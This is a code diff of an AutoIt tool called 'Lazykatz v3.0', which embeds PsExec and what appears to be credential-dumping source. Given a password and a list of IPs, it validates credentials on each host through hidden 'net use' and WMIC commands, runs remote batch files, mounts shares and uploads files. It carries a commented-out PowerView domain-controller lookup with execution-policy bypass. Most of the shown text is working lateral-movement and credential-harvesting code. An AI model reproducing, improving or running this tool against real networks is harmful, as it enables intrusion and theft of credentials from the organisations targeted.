@@ -1,4 +1,6 @@
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
+#AutoIt3Wrapper_Res_Description=Lazykatz v3.0
+#AutoIt3Wrapper_Res_Fileversion=3.0
 #AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 
@@ -8,7 +10,6 @@
 #include <GuiEdit.au3>
 #include <GuiStatusBar.au3>
 #include <WindowsConstants.au3>
-
 
 ;Local $iReturn = RunWait(@ComSpec & " /C " & 'powershell.exe -exec bypass -nop -command "import-module c:\Powerview.ps1;Get-NetDomainController" > b2.txt',"",@SW_HIDE,0x10000)
 
@@ -21,8 +22,9 @@ FileInstall("PsExec.exe", @TempDir & "\psexec.exe")
 FileInstall("katz.cs", @TempDir & "\katz.cs")
 FileInstall("key.snk", @TempDir & "\key.snk")
 
-$Form1 = GUICreate("Lazykatz", 622, 448, 192, 125)
-Global $idEdit = GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 350, 40, 250, 300)
+$Form1 = GUICreate("Lazykatz v3.0", 622, 448, 192, 125)
+GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 415, 40, 150, 25)
+Global $idEdit = GUICtrlCreateedit("", 350, 60, 250, 350)
 GUICtrlCreateLabel("Username", 80, 40, 90, 25)
 GUICtrlCreateLabel("Password", 80, 100, 90, 25)
 GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
@@ -30,7 +32,7 @@ GUICtrlCreateLabel("Choose Method", 80, 215, 90, 25)
 Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
 Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
 $Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
-$run = GUICtrlCreateButton("Start",80, 300, 120, 25)
+$run = GUICtrlCreateButton("Start",120, 320, 120, 25)
 $radio1 = GUICtrlCreateRadio("PsExec",180, 210, 50, 25)
 $radio2 = GUICtrlCreateRadio("WMIC",250, 210, 50, 25)
 Global $log = ""
@@ -68,7 +70,7 @@ FileDelete("output.txt")
 For $j = 1 to _FileCountLines($list)
     $ip = FileReadLine($list, $j)
 	Sleep(1000)
-	$log = "*** LAZYKATZ LOG ***"&@CRLF&@CRLF&"Targetting - "&$ip&@CRLF&@CRLF
+	$log = "Targetting - "&$ip&@CRLF&@CRLF
 	_GUICtrlEdit_SetText($idEdit, $log)
 	_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
 global $status = 1
@@ -77,21 +79,17 @@ global $status = 1
 
 if $method = "psexec" Then
 	logprint("Validating credentials using PsExec" & @CRLF)
+	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /delete /Y","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)
 EndIf
 
 if $method = "wmic" Then
 	logprint("Validating credentials using WMIC" & @CRLF)
-	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get status > output.txt 2>&1',"",@SW_HIDE,0x10000)
+	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get status 2>&1 | findstr /R /I /C:".*" > output.txt',"",@SW_HIDE,0x10000)
 EndIf
 ;----------------------------------------------
 
 local $file = "output.txt"
-
-If FileGetSize($file) < 20 Then
-		logprint("Error connecting - "&$ip & @CRLF)
-		global $status = 0
-EndIf
 
 FileOpen($file, 0)
 For $i = 1 to _FileCountLines($file)
@@ -104,6 +102,7 @@ For $i = 1 to _FileCountLines($file)
 	EndIf
 	Next
 FileClose($file)
+
 
 if not $status = 0 Then
 		logprint("Credentials are valid" & @CRLF)
@@ -131,6 +130,7 @@ if $method = "wmic" Then
 	logprint("Enabling temporary remote share" & @CRLF)
 	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
 	sleep (10000)
+	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\test$ /delete /Y","",@SW_HIDE,0x10000)
 	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\test$ /u:"&$user&" "&$pass&"","",@SW_HIDE,0x10000)
 	WEnd
 	logprint("Uploading files on remote share using WMIC" & @CRLF)
